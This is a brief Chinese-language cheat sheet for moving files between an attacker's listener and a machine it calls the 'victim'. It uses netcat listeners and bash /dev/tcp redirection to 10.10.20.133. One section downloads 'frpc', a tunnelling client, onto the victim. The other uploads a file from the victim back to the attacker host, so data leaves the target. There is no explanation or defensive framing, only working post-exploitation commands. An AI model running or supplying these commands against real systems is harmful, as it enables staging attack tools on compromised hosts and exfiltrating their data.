# 文件下载
回连机执行
```
nc -l -p 12345 < "frpc"
```
受害机执行
```
export RHOST=10.10.20.133
export RPORT=12345
export LFILE=frpc
bash -c 'cat < /dev/tcp/$RHOST/$RPORT > $LFILE'
```

# 文件上传
回连机执行
```
nc -l -p 12345 > "e"
```
受害机执行
```
export RHOST=10.10.20.133
export RPORT=12345
export LFILE=e
bash -c 'cat $LFILE > /dev/tcp/$RHOST/$RPORT'
```